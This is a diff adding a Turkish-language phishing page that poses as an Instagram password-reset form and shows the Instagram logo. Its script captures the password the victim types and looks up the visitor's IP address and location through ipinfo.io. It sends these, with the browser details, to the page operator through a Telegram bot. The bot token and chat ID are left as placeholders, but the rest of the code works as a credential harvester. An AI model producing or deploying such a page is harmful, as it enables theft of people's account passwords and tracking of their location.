@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Şifre Sıfırlama</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background-color: #fff;
+      padding: 40px 32px;
+      border: 1px solid #dbdbdb;
+      border-radius: 8px;
+      text-align: center;
+      width: 100%;
+      max-width: 350px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.03);
+    }
+
+    .logo {
+      width: 180px;
+      margin-bottom: 30px;
+    }
+
+    h2 {
+      font-size: 18px;
+      font-weight: 600;
+      margin-bottom: 20px;
+      color: #262626;
+    }
+
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 12px;
+      border: 1px solid #dbdbdb;
+      border-radius: 4px;
+      background-color: #fafafa;
+      font-size: 14px;
+      outline: none;
+    }
+
+    input:focus {
+      border-color: #a8a8a8;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #0095f6;
+      border: none;
+      color: white;
+      font-weight: 600;
+      font-size: 14px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    button:disabled {
+      background-color: #b2dffc;
+    }
+
+    .link {
+      color: #00376b;
+      text-decoration: none;
+      font-size: 14px;
+      margin-top: 20px;
+      display: block;
+    }
+
+    .divider {
+      border-top: 1px solid #dbdbdb;
+      margin: 25px 0;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Instagram Logo">
+    <h2>Yeni Şifre Talebi</h2>
+    <form id="resetForm">
+      <input type="password" id="newPassword" placeholder="Yeni Şifre" required>
+      <button type="submit">Şifreyi Sıfırla</button>
+    </form>
+    <div class="divider"></div>
+    <a class="link" href="#">Hesabınız yok mu? Kaydolun</a>
+  </div>
+
+  <script>
+    document.getElementById('resetForm').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const newPassword = document.getElementById('newPassword').value.trim();
+      if (!newPassword || newPassword.length < 6) {
+        alert("Lütfen en az 6 karakterli bir şifre girin.");
+        return;
+      }
+
+      fetch('https://ipinfo.io/json?token=25e0f9e274f6c3')
+        .then(res => res.json())
+        .then(info => {
+          const time = new Date().toLocaleString();
+          const userAgent = navigator.userAgent;
+          const location = `${info.city}, ${info.region}, ${info.country}`;
+          const ip = info.ip;
+
+          const message = 
+`Yeni Şifre Talebi:
+Şifre: ${newPassword}
+Zaman: ${time}
+Tarayıcı: ${userAgent}
+IP: ${ip}
+Konum: ${location}`;
+
+          const telegramBotToken = 'XXX'; // Gerçek token yerine XXX yazıldı
+          const chatId = 'XXX';
+
+          fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: message
+            })
+          })
+          .then(response => response.json())
+          .then(data => {
+            if (data.ok) {
+              alert('Yeni şifre isteğiniz alındı.');
+              document.getElementById('resetForm').reset();
+            } else {
+              alert('Bir hata oluştu. Lütfen tekrar deneyin.');
+            }
+          })
+          .catch(error => {
+            console.error('Error:', error);
+            alert('Bir hata oluştu.');
+          });
+        });
+    });
+  </script>
+</body>
+</html>
